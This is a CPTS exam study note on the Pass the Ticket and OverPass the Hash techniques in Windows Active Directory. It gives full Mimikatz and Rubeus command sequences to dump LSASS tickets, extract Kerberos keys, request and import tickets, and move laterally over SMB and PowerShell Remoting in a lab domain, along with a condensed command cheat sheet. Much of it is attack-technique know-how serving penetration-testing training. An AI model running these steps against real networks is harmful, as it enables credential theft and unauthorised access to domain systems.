# 🎫 1. Pass the Ticket (PtT) from Windows

> [!info]  
> **Pass the Ticket (PtT)** is an Active Directory lateral movement technique where an attacker uses a **stolen Kerberos ticket** to authenticate to network resources instead of using an NTLM password hash.
> 
> The key idea:
> 
> **PtH = steal/reuse a password hash**
> 
> **PtT = steal/reuse a Kerberos ticket**

```text
                    Active Directory
                          │
                          ▼
                    ┌───────────┐
                    │    KDC    │
                    │ DC / Kerb │
                    └─────┬─────┘
                          │
                 ┌────────▼────────┐
                 │ Kerberos Ticket │
                 └────────┬────────┘
                          │
                    🎫 Steal Ticket
                          │
                          ▼
                 ┌─────────────────┐
                 │ Attacker System │
                 └────────┬────────┘
                          │
                    🎫 Pass Ticket
                          │
                          ▼
                 ┌─────────────────┐
                 │ Network Service │
                 │ SMB / WinRM...  │
                 └─────────────────┘
```

---

# 🧠 2. Kerberos Protocol Refresher

Kerberos is a **ticket-based authentication protocol**.

Instead of repeatedly sending a user's password to every service, Kerberos gives the user tickets that can be presented to individual services.

> [!important]  
> The password is used primarily to obtain the initial **TGT**. After that, Kerberos tickets are used for authentication rather than repeatedly sending the password.

## 🎟️ 2.1 Ticket Granting Ticket — TGT

The **Ticket Granting Ticket (TGT)** is the first important ticket obtained from the Kerberos system.

A TGT allows the client to request additional service tickets (**TGS**).

```text
User
 │
 │ Authenticate
 ▼
KDC
 │
 │ TGT
 ▼
User
```

The TGT is then used to request tickets for specific services.

---

## 🎫 2.2 Ticket Granting Service — TGS

A **Ticket Granting Service (TGS) ticket** is used to access a particular service.

Example: If a user wants to access an MSSQL server:

```text
User
 │
 │ TGT
 ▼
KDC
 │
 │ TGS for MSSQL
 ▼
User
 │
 │ TGS
 ▼
MSSQL Server
 │
 ▼
Authentication
```

> [!tip]  
> Think of the **TGT as a master ticket** that allows you to request more specific tickets.
> 
> A **TGS is a service-specific ticket**.

---

# 🔐 3. Kerberos Authentication Flow

When requesting a TGT, the user authenticates to the Domain Controller by encrypting the current timestamp using their password-derived key/hash.

The DC validates the request and returns a TGT.

```text
        1️⃣ User authenticates
              │
              ▼
        ┌─────────────┐
        │ Domain      │
        │ Controller  │
        └──────┬──────┘
               │
               │ 2️⃣ TGT
               ▼
             User
               │
               │ 3️⃣ TGT
               ▼
              KDC
               │
               │ 4️⃣ TGS
               ▼
         Specific Service
```

Once the user possesses the required ticket, they don't need to prove their identity to every service using their password again.

---

# 🎯 4. What Is a Pass the Ticket Attack?

A PtT attack requires a **valid Kerberos ticket**.

There are two important ticket types:

|Ticket|Purpose|
|---|---|
|**TGS**|Provides access to a particular service/resource.|
|**TGT**|Can be used to request TGS tickets for resources the user has permission to access.|

### 🧠 Mental Model

```text
🎫 TGS
 │
 └──► Access THIS particular service

🎫 TGT
 │
 └──► Request service tickets
       │
       ├──► SMB
       ├──► WinRM
       ├──► MSSQL
       └──► Other Kerberos services
```

> [!important]  
> A **TGT generally provides more flexibility than a TGS** because it can be used to request additional service tickets according to the user's privileges.

---

# 🖥️ 5. Scenario

A typical pentest scenario:

```text
1. 🎣 Phish user
       ↓
2. 💻 Gain access to workstation
       ↓
3. ⬆️ Obtain local administrator privileges
       ↓
4. 🔎 Access LSASS
       ↓
5. 🎫 Harvest Kerberos tickets
       ↓
6. 📦 Export / obtain ticket
       ↓
7. 🎫 Pass the Ticket
       ↓
8. 🌐 Move laterally
```

The important advantage is that **the attack can use the victim's existing Kerberos authentication material without needing their plaintext password**.

---

# 🧠 6. Harvesting Kerberos Tickets from Windows

Windows Kerberos tickets are processed and stored by:

`LSASS` — **Local Security Authority Subsystem Service**

Therefore, harvesting tickets involves interacting with LSASS.

### Permissions

|Privilege|Ticket Access|
|---|---|
|Standard user|Can retrieve their own tickets|
|Local administrator|Can collect tickets from the system|

> [!important]  
> To collect **all tickets** from a Windows system, Mimikatz or Rubeus must be executed with **administrator privileges**.

---

# 🛠️ 7. Mimikatz — Export Kerberos Tickets

Mimikatz uses:

```text
sekurlsa::tickets /export
```

Example:

```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```

The exported tickets are saved as:

```text
.kirbi
```

Example:

```text
-a----  7/12/2022  9:44 AM  1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
-a----  7/12/2022  9:44 AM  1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
```

---

# 🔎 8. Understanding `.kirbi` Ticket Names

Ticket filenames can provide useful information.

### Computer accounts

Tickets ending with `$` generally correspond to **computer accounts**.

Example:

```text
DC01$
```

Computer accounts need Kerberos tickets to interact with Active Directory.

### User accounts

User tickets typically contain the username followed by `@`, separating the service/domain information.

Example:

```text
[randomvalue]-username@service-domain.local.kirbi
```

### `krbtgt`

> [!important]  
> If the service name is **`krbtgt`**, the ticket corresponds to the account's **TGT**.

```text
plaintext@krbtgt-inlanefreight.htb.kirbi
                 │
                 └── TGT
```

---

# 🐇 9. Rubeus — Export Kerberos Tickets

Rubeus can dump Kerberos tickets using:

```cmd
Rubeus.exe dump /nowrap
```

Example:

```cmd
c:\tools> Rubeus.exe dump /nowrap
```

Rubeus outputs the ticket in **Base64** rather than directly creating a `.kirbi` file.

The `/nowrap` option makes the Base64 output easier to copy.

Example output contains:

```text
ServiceName           : krbtgt/inlanefreight.htb
ServiceRealm          : inlanefreight.htb
UserName              : plaintext
UserRealm             : inlanefreight.htb
...
Base64EncodedTicket   :
doIE1jCCBNKgAwIBBaEDAgEW...
```

---

# ⚠️ 10. Mimikatz Encryption-Key Issue

The source notes a version-specific issue involving:

```text
Mimikatz 2.2.0 20220919
```

On some Windows 10 versions:

```text
sekurlsa::ekeys
```

may display hashes as:

```text
des_cbc_md4
```

This can cause exported tickets from:

```text
sekurlsa::tickets /export
```

to not work correctly because of incorrect encryption handling.

> [!warning]  
> If exported `.kirbi` tickets don't work as expected, the source notes that the extracted hashes can still potentially be used to generate new tickets, or **Rubeus** can be used to export tickets in Base64 format.

---

# 🔑 11. Pass the Key / OverPass the Hash

**Pass the Key**, also called **OverPass the Hash**, is related to PtT but is not exactly the same operation.

### Traditional Pass the Hash

PtH reuses an **NTLM hash** directly.

```text
NTLM Hash
    │
    ▼
NTLM Authentication
    │
    ▼
Service
```

### OverPass the Hash

OverPass the Hash takes a user's Kerberos encryption key/hash and uses it to obtain a **TGT**.

Possible key types include:

```text
RC4_HMAC
AES128
AES256
DES
```

Conceptually:

```text
User's Kerberos Key
        │
        ▼
   Request TGT
        │
        ▼
🎫 Kerberos TGT
        │
        ▼
Request TGS
        │
        ▼
Access Services
```

> [!important]  
> **OverPass the Hash = use a password-derived Kerberos key/hash to obtain a Kerberos TGT.**
> 
> **Pass the Ticket = use an existing Kerberos ticket for authentication.**

---

# 🔎 12. Extract Kerberos Keys with Mimikatz

Mimikatz can enumerate Kerberos encryption keys using:

```text
sekurlsa::ekeys
```

Example:

```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
```

Example output:

```text
* Username : plaintext
* Domain   : inlanefreight.htb
* Password : (null)
* Key List :
  aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
  rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
  rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
  rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
```

Important keys:

```text
AES256_HMAC
RC4_HMAC
```

can be used for the OverPass the Hash / Pass the Key technique.

---

# 🛠️ 13. Mimikatz — OverPass the Hash

Mimikatz uses:

```text
sekurlsa::pth
```

Example:

```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

The command creates a new `cmd.exe` process in the target user's context.

Conceptually:

```text
NTLM Hash
   │
   ▼
sekurlsa::pth
   │
   ▼
New cmd.exe
   │
   ▼
Request Kerberos access
   │
   ▼
Access services as target user
```

> [!important]  
> According to the source, **Mimikatz requires administrative rights** to perform the Pass the Key / OverPass the Hash attack.

---

# 🐇 14. Rubeus — OverPass the Hash

Rubeus uses:

```text
asktgt
```

The relevant key options are:

```text
/rc4
/aes128
/aes256
/des
```

Example using AES-256:

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

The important result is:

```text
[+] TGT request successful!
```

followed by:

```text
Base64(ticket.kirbi):
...
```

> [!tip]  
> `asktgt` means **ask the KDC for a TGT** using the supplied Kerberos key/hash.

According to the source:

- **Mimikatz** requires administrative privileges.
    
- **Rubeus** does not require administrative privileges for this operation.
    

---

# ⚠️ 15. Kerberos Encryption Downgrade

Modern Windows domains with functional level **2008 and above** use AES encryption by default for normal Kerberos exchanges.

Common modern encryption:

```text
AES256_CTS_HMAC_SHA1
AES128
```

If an attacker uses:

```text
RC4_HMAC
```

using an NTLM hash during a Kerberos exchange instead of the expected AES key, this can potentially appear as an **encryption downgrade**.

```text
Normal:
User
 ↓
AES256
 ↓
Kerberos

Potentially suspicious:
User
 ↓
RC4_HMAC / NTLM
 ↓
Kerberos
```

> [!warning]  
> Using RC4 in a modern Kerberos environment can create a detectable **encryption downgrade** signal.

---

# 🎫 16. Pass the Ticket with Rubeus

After obtaining a TGT/TGS, Rubeus can import it into the current logon session with:

```text
/ptt
```

Example:

```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

The critical success message is:

```text
[+] Ticket successfully imported!
```

### 🧠 What `/ptt` means

```text
asktgt
  │
  ▼
Obtain TGT
  │
  ▼
/ptt
  │
  ▼
Import ticket into current logon session
  │
  ▼
Use Kerberos-authenticated services
```

---

# 📂 17. Pass the Ticket from a `.kirbi` File

If Mimikatz exported a ticket to disk, Rubeus can import it using:

```cmd
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Output:

```text
[*] Action: Import Ticket
[+] ticket successfully imported!
```

After importing the ticket, the session can access resources available to the ticket.

Example:

```cmd
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

---

# 🔄 18. `.kirbi` → Base64

A `.kirbi` ticket can be converted into Base64 with PowerShell.

```powershell
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

The result is a Base64-encoded ticket:

```text
doQAAAWfMIQAAAWZoIQAAAADAgEF...
```

This is useful when a tool expects the ticket as a Base64 string rather than a file.

---

# 🎫 19. Pass the Ticket Using Base64

Rubeus can accept the Base64 ticket directly:

```cmd
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEW...SNIP...
```

Successful import:

```text
[*] Action: Import Ticket
[+] ticket successfully imported!
```

The ticket can then be used to access resources:

```cmd
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

---

# 🛠️ 20. Mimikatz — Pass the Ticket

Mimikatz uses:

```text
kerberos::ptt
```

Example:

```cmd
C:\tools> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

Successful file processing:

```text
* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
```

The ticket is now available to the session.

Test access:

```cmd
c:\tools> dir \\DC01.inlanefreight.htb\c$
```

---

# 🪟 21. Mimikatz `misc::cmd`

Instead of exiting Mimikatz and returning to the existing command prompt, the source notes that Mimikatz can launch a new command prompt using:

```text
misc::cmd
```

This can be useful for working with the imported ticket in a new command prompt.

---

# 🌐 22. Pass the Ticket with PowerShell Remoting

**PowerShell Remoting** allows commands/scripts to execute on remote Windows computers.

It is commonly used by administrators for remote management.

Default listeners:

|Protocol|Port|
|---|--:|
|HTTP|TCP/5985|
|HTTPS|TCP/5986|

PowerShell Remoting requires appropriate permissions, such as:

- Administrative permissions
    
- Membership in **Remote Management Users**
    
- Explicit PowerShell Remoting permissions in the session configuration
    

> [!important]  
> A user does **not necessarily need to be a local administrator on the remote system** if they have appropriate PowerShell Remoting permissions, such as membership in Remote Management Users.

---

# 🎫 23. Mimikatz + PowerShell Remoting PtT

The basic workflow is:

```text
🎫 Obtain Kerberos Ticket
        ↓
🛠️ Mimikatz kerberos::ptt
        ↓
📥 Import Ticket
        ↓
🐚 Launch PowerShell
        ↓
🌐 Enter-PSSession
        ↓
💻 Remote System
```

Example:

```cmd
C:\tools> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!
```

Then:

```cmd
c:\tools>powershell
```

Connect:

```powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
```

Once connected:

```powershell
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john

[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

This demonstrates lateral movement using the imported Kerberos identity.

---

# 🐇 24. Rubeus `createnetonly` — Sacrificial Logon Session

Rubeus provides another useful approach through:

```text
createnetonly
```

This creates a **sacrificial process/logon session**.

It uses:

```text
Logon Type 9
```

and is equivalent in concept to:

```cmd
runas /netonly
```

The process is hidden by default, but:

```text
/show
```

displays it.

Example:

```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Example output:

```text
[*] Action: Create process (/netonly)

[*] Using random username and password.
[*] Showing process : True
[*] Username        : JMI8CL7C
[*] Domain          : DTCDV6VL
[*] Password        : MRWI6XGI
[+] Process         : 'cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1556
[+] LUID            : 0xe07648
```

> [!important]  
> The purpose of the sacrificial session is to provide an isolated logon context so that importing/requesting tickets does not erase or interfere with the existing TGTs in the current session.

---

# 🔐 25. Rubeus Sacrificial Process → TGT → PtT → WinRM

Once the sacrificial `cmd.exe` is created, execute Rubeus from that new window.

Request a TGT with `/ptt`:

```cmd
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

The important sequence is:

```text
createnetonly
      │
      ▼
Sacrificial cmd.exe
      │
      ▼
asktgt
      │
      ▼
TGT
      │
      ▼
/ptt
      │
      ▼
Ticket imported
      │
      ▼
PowerShell
      │
      ▼
Enter-PSSession -ComputerName DC01
      │
      ▼
Remote shell
```

The source's successful output includes:

```text
[+] TGT request successful!
```

and:

```text
[+] Ticket successfully imported!
```

Then:

```cmd
c:\tools>powershell
```

```powershell
PS C:\tools> Enter-PSSession -ComputerName DC01
```

Result:

```text
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john

[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

---

# 🧩 26. PtH vs OverPass the Hash vs PtT

|Technique|Starting Material|What Happens|Result|
|---|---|---|---|
|**Pass the Hash (PtH)**|NTLM hash|Reuse hash directly for NTLM authentication|Authenticate without plaintext password|
|**OverPass the Hash / Pass the Key**|Kerberos key/hash such as RC4/AES|Use key to request a TGT|Obtain Kerberos authentication material|
|**Pass the Ticket (PtT)**|Existing TGT/TGS|Import/use the ticket|Authenticate to Kerberos services|

### 🧠 Remember

```text
                CREDENTIAL MATERIAL
                       │
          ┌────────────┼────────────┐
          │            │            │
          ▼            ▼            ▼
       NTLM Hash    Kerberos Key   Kerberos Ticket
          │            │            │
          ▼            ▼            ▼
         PtH       OverPass/PtK     PtT
          │            │            │
          ▼            ▼            ▼
       NTLM Auth     Get TGT       Use Ticket
```

---

# 🧪 27. Mimikatz vs Rubeus Cheat Sheet

|Goal|Mimikatz|Rubeus|
|---|---|---|
|Debug privilege|`privilege::debug`|—|
|Dump Kerberos tickets|`sekurlsa::tickets /export`|`dump`|
|Extract Kerberos keys|`sekurlsa::ekeys`|—|
|OverPass the Hash|`sekurlsa::pth`|`asktgt`|
|Pass Ticket from `.kirbi`|`kerberos::ptt`|`ptt /ticket:<file>`|
|Pass Ticket from Base64|—|`ptt /ticket:<base64>`|
|Create sacrificial process|—|`createnetonly`|
|New command prompt with ticket|`misc::cmd`|—|

---

# 🧠 28. Complete Windows PtT Mental Model

```text
                    WINDOWS HOST
                         │
                         ▼
                    🔎 LSASS
                         │
             ┌───────────┴───────────┐
             │                       │
             ▼                       ▼
       🎫 Existing Tickets      🔑 Kerberos Keys
             │                       │
             │                       ▼
             │                  OverPass Hash
             │                       │
             │                       ▼
             │                    🎫 TGT
             │                       │
             └───────────┬───────────┘
                         ▼
                    🎫 Kerberos
                       Ticket
                         │
                         ▼
                      /ptt
                         │
                         ▼
                Current Logon Session
                         │
             ┌───────────┼────────────┐
             │           │            │
             ▼           ▼            ▼
            SMB        WinRM        MSSQL
             │           │            │
             └───────────┼────────────┘
                         ▼
                  🌐 Lateral Movement
```

---

# 📝 29. CPTS Exam Cheat Sheet

### 🎫 Ticket Types

```text
TGT = Ticket Granting Ticket
     → Used to request TGS tickets

TGS = Ticket Granting Service ticket
     → Used to access a specific service
```

### 🔎 Harvest

```cmd
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

```cmd
Rubeus.exe dump /nowrap
```

### 🔑 Extract Kerberos Keys

```text
sekurlsa::ekeys
```

Look for:

```text
aes256_hmac
rc4_hmac_nt
```

### 🔐 OverPass the Hash

Mimikatz:

```text
sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<NTLM>
```

Rubeus:

```text
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<key> /nowrap
```

### 🎫 Pass the Ticket

Rubeus:

```text
Rubeus.exe ptt /ticket:<file>
```

or:

```text
Rubeus.exe ptt /ticket:<base64>
```

Mimikatz:

```text
kerberos::ptt "<path-to-ticket.kirbi>"
```

### 🪟 PowerShell Remoting

```powershell
Enter-PSSession -ComputerName <target>
```

Default ports:

```text
5985 = HTTP
5986 = HTTPS
```

### 🐇 Sacrificial Session

```text
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Then:

```text
Rubeus.exe asktgt ... /ptt
```

---

# ⚠️ 30. High-Value CPTS Notes

> [!important]  
> **TGT vs TGS**
> 
> `TGT` → lets the user request additional service tickets.
> 
> `TGS` → provides authentication to a particular service.

> [!important]  
> **OverPass the Hash is not the same as PtT.**
> 
> OverPass uses a password-derived Kerberos key/hash to obtain a TGT.
> 
> PtT takes an already obtained Kerberos ticket and injects/imports it into a session.

> [!warning]  
> **Administrative privileges matter.**
> 
> According to the source, collecting all tickets with Mimikatz/Rubeus requires administrative access. Mimikatz also requires administrative rights for its Pass the Key/OverPass operation, while Rubeus does not for the described `asktgt` operation.

> [!tip]  
> **`/ptt` = Pass The Ticket**
> 
> When you see `/ptt` in a Rubeus command, think:
> 
> **"Take the ticket I just obtained and put it into the current logon session."**

> [!tip]  
> **`krbtgt` in the service name = TGT**
> 
> Example:
> 
> ```text
> plaintext@krbtgt-inlanefreight.htb.kirbi
> ```
> 
> The `krbtgt` service indicates a **Ticket Granting Ticket**.

> [!warning]  
> **RC4 in modern Kerberos**
> 
> Modern Windows domains generally use AES for normal Kerberos exchanges. Using an NTLM/RC4 key instead can potentially create an **encryption downgrade** detection signal.

---

# ✅ 31. Key Takeaways

1. 🎫 **Pass the Ticket (PtT)** uses stolen Kerberos tickets for lateral movement.
    
2. 🔐 **TGTs** are used to request **TGS tickets**.
    
3. 🎯 **TGS tickets** provide access to specific services.
    
4. 🧠 Windows stores/processes Kerberos tickets through **LSASS**.
    
5. 🛠️ Mimikatz can export tickets with `sekurlsa::tickets /export`.
    
6. 🐇 Rubeus can dump tickets with `dump`.
    
7. 🔑 `sekurlsa::ekeys` exposes Kerberos encryption keys.
    
8. 🔄 **OverPass the Hash / Pass the Key** converts a usable Kerberos key/hash into a TGT.
    
9. 🎫 Rubeus `/ptt` imports a ticket into the current logon session.
    
10. 📂 `.kirbi` files contain exported Kerberos tickets.
    
11. 🧬 `.kirbi` tickets can be converted to Base64 and imported with Rubeus.
    
12. 🪟 Imported tickets can be used for services such as SMB and PowerShell Remoting.
    
13. 🌐 PowerShell Remoting normally uses TCP `5985`/`5986`.
    
14. 🐇 Rubeus `createnetonly` creates an isolated **Logon Type 9** sacrificial process.
    
15. 🚀 The overall lateral-movement chain is:
    

```text
🔎 Obtain access
      ↓
⬆️ Privilege
      ↓
🎫 Harvest ticket / 🔑 Kerberos key
      ↓
🔄 OverPass the Hash if necessary
      ↓
🎫 Obtain TGT/TGS
      ↓
📥 Pass the Ticket
      ↓
🌐 Access remote service
      ↓
➡️ Lateral Movement
```